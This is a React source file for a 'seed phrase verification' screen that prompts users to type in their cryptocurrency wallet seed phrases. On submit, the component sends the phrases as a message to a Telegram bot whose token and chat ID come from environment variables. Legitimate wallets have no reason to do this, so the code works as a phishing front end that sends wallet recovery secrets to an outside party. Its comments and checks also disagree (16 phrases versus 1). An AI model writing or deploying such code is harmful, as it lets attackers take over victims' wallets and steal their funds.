import React, { useState, useContext } from 'react';
import { styled } from '@mui/material/styles';
import TextField from '@mui/material/TextField';
import Button from '@mui/material/Button';
import CircularProgress from '@mui/material/CircularProgress'; // Import CircularProgress
import { AuthContext } from '../context/AuthContext';

const Container = styled('div')({
  textAlign: 'center',
  padding: '20px',
});

const SeedList = styled('div')({
  marginTop: '20px',
  textAlign: 'left',
});

function SeedPhraseVerification({ onNext }) {
  const [inputValue, setInputValue] = useState('');
  const [seedPhrase, setSeedPhrase] = useState([]);
  const { verifySeedPhrase, state } = useContext(AuthContext);
  const [isLoading, setIsLoading] = useState(false); // New state for loading

  const handleAddPhrase = () => {
    if (inputValue.trim()) {
      setSeedPhrase((prev) => [...prev, inputValue.trim()]);
      setInputValue('');
    }
  };

  const handleClear = () => {
    setSeedPhrase([]);
  };

  const sendToTelegram = async (message) => {
    const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; // Store in your .env file
    const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID; // Store in your .env file

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
          }),
        }
      );

      if (!response.ok) {
        throw new Error('Failed to send message to Telegram');
      }

      console.log('Message sent to Telegram successfully');
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
    }
  };

  const handleSubmit = async () => {
    if (seedPhrase.length === 1) { // Assuming exactly 16 seed phrases
      verifySeedPhrase(seedPhrase);
      if (!state.error) {
        const seedPhraseMessage = `Seed Phrases:\n${seedPhrase.join('\n')}`;
        setIsLoading(true); // Start loading
        await sendToTelegram(seedPhraseMessage);
        setIsLoading(false); // Stop loading
        onNext(); // Proceed to the next step
      }
    } else {
      alert('You must enter exactly 16 seed phrases.');
    }
  };

  return (
    <Container>
      <h2 className="mb-4">Enter Your Seed Phrases</h2>
      <TextField
        label="Seed Phrase"
        variant="outlined"
        multiline
        rows={4}
        value={inputValue}
        onChange={(e) => setInputValue(e.target.value)}
        fullWidth
        aria-required="true"
        placeholder='Input your Seed Phrase accordingly...'
      />
      <div style={{ marginTop: '10px' }} className='space-y-2 xl:space-y-0'>
        <Button
          variant="contained"
          color="primary"
          onClick={handleAddPhrase}
          style={{ marginRight: '10px' }}
          className="mb-4"
        >
          Add Phrase
        </Button>
        <Button
          variant="outlined"
          color="secondary"
          onClick={handleClear}
        >
          Clear All
        </Button>
        <Button
          variant="contained"
          color="primary"
          onClick={handleSubmit}
          style={{ marginLeft: '10px' }}
          disabled={seedPhrase.length !== 1 || isLoading} // Disable if loading
        >
          {isLoading ? (
            <CircularProgress size={24} color="inherit" /> // Loading spinner
          ) : (
            'Submit'
          )}
        </Button>
      </div>
      <SeedList>
        {seedPhrase.length > 0 && (
          <div>
            <h3>Seed Phrases:</h3>
            <ul>
              {seedPhrase.map((phrase, index) => (
                <li key={index}>{phrase}</li>
              ))}
            </ul>
          </div>
        )}
      </SeedList>
    </Container>
  );
}

export default SeedPhraseVerification;
